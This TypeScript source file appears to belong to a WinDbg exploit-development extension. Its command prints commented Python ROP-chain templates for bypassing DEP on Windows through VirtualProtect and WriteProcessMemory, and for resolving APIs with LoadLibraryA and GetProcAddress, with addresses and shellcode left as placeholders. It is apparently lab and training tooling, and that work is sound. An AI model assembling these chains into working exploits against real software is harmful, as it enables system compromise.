import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

function vpTemplate(mod: string): void {
  out.section("VirtualProtect DEP Bypass — ROP Chain Skeleton");
  out.print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
  out.print("Goal:      mark shellcode region PAGE_EXECUTE_READWRITE (flNewProtect = 0x40)");

  out.section("Step 1 — find addresses");
  out.print(`  VirtualProtect addr:   dx @$osed().sc.iat_find("VirtualProtect")`);
  out.print(`  jmp esp (dispatch):    dx @$osed().find_bytes("${mod}", "FF E4")`);
  out.print(`  pushad ; ret:          dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print(`  Gadgets (pop/inc/neg): dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);
  out.print(`  Stack adjustments:     dx @$osed().add_esp("${mod}")`);
  out.print(`  Writable addr:         dx @$osed().modules()  -- pick a .data section address`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to VirtualProtect address)");
  out.print("    [ESP+4]  = ESI  <- return addr for VP's RETN 10h (set to jmp esp)");
  out.print("    [ESP+8]  = EBP  <- lpAddress  (set to shellcode start)");
  out.print("    [ESP+12] = saved_ESP <- dwSize (stack addr — rounds up, usually OK)");
  out.print("    [ESP+16] = EBX  <- flNewProtect = 0x40");
  out.print("    [ESP+20] = EDX  <- lpflOldProtect (writable dummy)");
  out.print("    [ESP+24] = ECX  <- (unused by VirtualProtect)");
  out.print("    [ESP+28] = EAX  <- (unused by VirtualProtect)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET   = ???           # bytes from buffer start to EIP control");
  out.print("VP       = 0x????????    # VirtualProtect  dx @$osed().sc.iat_find(\"VirtualProtect\")");
  out.print(`JMP_ESP  = 0x????????    # jmp esp         dx @$osed().find_bytes("${mod}", "FF E4")`);
  out.print("WRITABLE = 0x????????    # writable addr   dx @$osed().modules() -> .data section");
  out.print("LP_ADDR  = 0x????????    # shellcode addr  compute from ESP (see step 4)");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(VP)          # EDI = VirtualProtect address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(JMP_ESP)     # ESI = jmp esp (return to shellcode after VP)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(LP_ADDR)     # EBP = lpAddress (shellcode start, see step 4)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(0x00000040)  # EBX = flNewProtect (PAGE_EXECUTE_READWRITE)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret");
  out.print("rop_chain += p32(WRITABLE)    # EDX = lpflOldProtect dummy");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused — any writable value)");
  out.print("rop_chain += p32(WRITABLE)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused — put 0 or junk)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print("# ── NOP sled + shellcode ──");
  out.print("nop_sled  = b\"\\x90\" * 16    # dx @$osed().nop(16)");
  out.print("shellcode = nop_sled + b\"\\xfc\\xe8...\"  # your payload");
  out.print('                               # dx @$osed().encode("FC E8 ...", "00 0A 0D")');
  out.print("");
  out.print("payload = b\"A\" * OFFSET + rop_chain + shellcode");

  out.section("Step 4 — compute LP_ADDR (shellcode stack address)");
  out.print("  The PUSHAD technique uses the saved ESP (stack addr before PUSHAD) as dwSize.");
  out.print("  To find LP_ADDR (EBP = shellcode location on stack):");
  out.print("  1. Run exploit with 'CC' shellcode; check EBP at VirtualProtect breakpoint.");
  out.print("  2. Or: prepend gadgets to capture ESP and add the chain-to-shellcode offset:");
  out.print("       dx @$osed().rop_suggest(...)  ->  push esp ; pop eax ; ret");
  out.print("       dx @$osed().add_esp(...)      ->  add eax, N ; ret   (N = measured offset)");
  out.print("     Then use a  mov [writable], eax ; ret  gadget and patch EBP from that addr.");
}

function wpmTemplate(mod: string): void {
  out.section("WriteProcessMemory DEP Bypass — ROP Chain Skeleton");
  out.print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)");
  out.print("Goal:      copy shellcode into a known-executable .text section, then jump to it.");

  out.section("Find addresses");
  out.print(`  WriteProcessMemory:  dx @$osed().sc.iat_find("WriteProcessMemory")`);
  out.print(`  Writable addr:       dx @$osed().modules()  -- any .data section`);
  out.print(`  Executable target:   dx @$osed().modules()  -- any .text section address`);
  out.print(`  Gadgets:             dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);

  out.section("Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET      = ???          # EIP control offset");
  out.print("WPM         = 0x????????   # WriteProcessMemory  dx @$osed().sc.iat_find(...)");
  out.print("EXEC_TARGET = 0x????????   # executable .text address to write shellcode into");
  out.print("WRITABLE    = 0x????????   # .data writable addr");
  out.print("SC_SRC      = 0x????????   # shellcode source (stack addr — compute dynamically)");
  out.print("");
  out.print("# PUSHAD register map for WriteProcessMemory(hProcess, lpBase, lpBuf, nSize, lpWritten):");
  out.print("#   EDI = WPM            ESI = return addr   EBP = hProcess (0xFFFFFFFF = current)");
  out.print("#   EBX = lpBaseAddress  EDX = lpBuffer      ECX = nSize    EAX = lpBytesWritten");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(WPM)");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(0x????????)  # return addr after WPM (jmp to EXEC_TARGET)");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(0xFFFFFFFF)  # hProcess = GetCurrentProcess()");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(EXEC_TARGET) # lpBaseAddress");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret");
  out.print("rop_chain += p32(SC_SRC)      # lpBuffer (shellcode source on stack)");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret");
  out.print("rop_chain += p32(0x00000201)  # nSize");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret");
  out.print("rop_chain += p32(WRITABLE)    # lpBytesWritten (dummy writable)");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print("");
  out.print("shellcode = b\"\\x90\" * 16 + b\"\\xfc\\xe8...\"");
  out.print("payload   = b\"A\" * OFFSET + rop_chain + shellcode");
}

function llaTemplate(mod: string): void {
  out.section("LoadLibraryA — ROP Chain Skeleton");
  out.print("Prototype: HMODULE LoadLibraryA(LPCSTR lpLibFileName)");
  out.print("Goal:      load a DLL at runtime to resolve APIs not in the target's IAT.");
  out.print("Returns:   HMODULE in EAX (pass to GetProcAddress).");

  out.section("Step 1 — find addresses");
  out.print(`  LoadLibraryA addr:     dx @$osed().sc.iat_find("LoadLibraryA")`);
  out.print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to LoadLibraryA address)");
  out.print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. GetProcAddress)");
  out.print("    [ESP+8]  = EBP  <- lpLibFileName (pointer to DLL name string)");
  out.print("    [ESP+12] = saved_ESP <- (unused by LoadLibraryA)");
  out.print("    [ESP+16] = EBX  <- (unused)");
  out.print("    [ESP+20] = EDX  <- (unused)");
  out.print("    [ESP+24] = ECX  <- (unused)");
  out.print("    [ESP+28] = EAX  <- (unused)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET       = ???           # bytes from buffer start to EIP control");
  out.print("LLA          = 0x????????    # LoadLibraryA  dx @$osed().sc.iat_find(\"LoadLibraryA\")");
  out.print("NEXT_STAGE   = 0x????????    # return addr (e.g. GetProcAddress chain entry)");
  out.print("DLL_NAME_PTR = 0x????????    # pointer to null-terminated DLL name (e.g. \"ws2_32.dll\")");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(LLA)         # EDI = LoadLibraryA address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr (next stage)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(DLL_NAME_PTR)# EBP = lpLibFileName");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret  (EBX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print("# LoadLibraryA returns HMODULE in EAX — chain NEXT_STAGE to");
  out.print("# a GetProcAddress chain that consumes EAX as hModule.");

  out.section("Step 4 — staging the DLL name string");
  out.print("  The DLL name (e.g. \"ws2_32.dll\\x00\") must be null-terminated and");
  out.print("  accessible at DLL_NAME_PTR when LoadLibraryA runs. Options:");
  out.print("  1. Place it on the stack after the chain and compute its ESP-relative address.");
  out.print("  2. Write it into a writable .data section via WriteProcessMemory or mov [reg],val gadgets.");
  out.print("  3. Find it already in memory (e.g. a string table in the target binary).");
}

function gpaTemplate(mod: string): void {
  out.section("GetProcAddress — ROP Chain Skeleton");
  out.print("Prototype: FARPROC GetProcAddress(HMODULE hModule, LPCSTR lpProcName)");
  out.print("Goal:      resolve a function address from a loaded DLL at runtime.");
  out.print("Returns:   FARPROC (function pointer) in EAX.");

  out.section("Step 1 — find addresses");
  out.print(`  GetProcAddress addr:   dx @$osed().sc.iat_find("GetProcAddress")`);
  out.print(`  Gadgets (pop/etc):     dx @$osed().rop_suggest("${mod}", 50, true, "fast", "semantic")`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to GetProcAddress address)");
  out.print("    [ESP+4]  = ESI  <- return addr (next chain stage, e.g. call eax)");
  out.print("    [ESP+8]  = EBP  <- hModule (from LoadLibraryA return value in EAX)");
  out.print("    [ESP+12] = saved_ESP <- lpProcName (not directly settable)");
  out.print("    [ESP+16] = EBX  <- (lpProcName alternative — see constraints)");
  out.print("    [ESP+20] = EDX  <- (unused)");
  out.print("    [ESP+24] = ECX  <- (unused)");
  out.print("    [ESP+28] = EAX  <- (unused)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET        = ???           # bytes from buffer start to EIP control");
  out.print("GPA           = 0x????????    # GetProcAddress  dx @$osed().sc.iat_find(\"GetProcAddress\")");
  out.print("NEXT_STAGE    = 0x????????    # return addr (e.g. jmp eax / call eax to run resolved func)");
  out.print("HMODULE       = 0x????????    # hModule from LoadLibraryA (or known module base)");
  out.print("FUNC_NAME_PTR = 0x????????    # pointer to null-terminated function name string");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(GPA)         # EDI = GetProcAddress address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(NEXT_STAGE)  # ESI = return addr");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(HMODULE)     # EBP = hModule");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(FUNC_NAME_PTR)# EBX = lpProcName");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret  (EDX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print(`                               #   dx @$osed().find_bytes("${mod}", "60 C3")`);
  out.print("");
  out.print("# GetProcAddress returns FARPROC in EAX — dispatch via jmp eax or call eax.");

  out.section("Constraints");
  out.print("  PUSHAD places saved ESP as the 2nd argument (lpProcName). Since saved ESP");
  out.print("  is not directly settable, the PUSHAD technique only works if:");
  out.print("  1. You use a flat stdcall frame (no PUSHAD) and place hModule/lpProcName directly.");
  out.print("  2. Or you stage lpProcName at a known address and accept saved ESP as junk,");
  out.print("     rearranging the register map to put lpProcName in EBX (requires a different");
  out.print("     dispatch shape or a RET-slide variant).");
  out.print("  3. Or chain from LoadLibraryA where EAX already holds hModule and use gadgets");
  out.print("     to marshal arguments directly.");
  out.print("");
  out.print("  For chained LoadLibraryA -> GetProcAddress resolution, a flat stdcall frame");
  out.print("  or IAT slot_call dispatch is usually simpler than PUSHAD.");
}

export function createRopTemplateCommand(): Command {
  return {
    name: "rop_template",
    description: "Print a commented ROP chain skeleton for a supported API.",
    usage: "dx @$osed().rop_template(api?, module?)",
    examples: [
      'dx @$osed().rop_template("VirtualProtect", "essfunc")',
      'dx @$osed().rop_template("WriteProcessMemory", "essfunc")',
      'dx @$osed().rop_template("LoadLibraryA", "essfunc")',
      'dx @$osed().rop_template("GetProcAddress", "essfunc")',
    ],
    schema: {
      api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory", "LoadLibraryA", "GetProcAddress"], default: "VirtualProtect" },
      module: { type: "string", default: "TARGET_MODULE" },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const api = (options.api as string | undefined) ?? "VirtualProtect";
      const mod = (options.module as string | undefined) ?? "TARGET_MODULE";

      switch (api) {
        case "WriteProcessMemory": wpmTemplate(mod); break;
        case "LoadLibraryA": llaTemplate(mod); break;
        case "GetProcAddress": gpaTemplate(mod); break;
        default: vpTemplate(mod); break;
      }

      return {
        command: "rop_template",
        args: options,
        success: true,
        findings: [{ api, module: mod }],
        warnings: [],
        errors: [],
      };
    },
  };
}
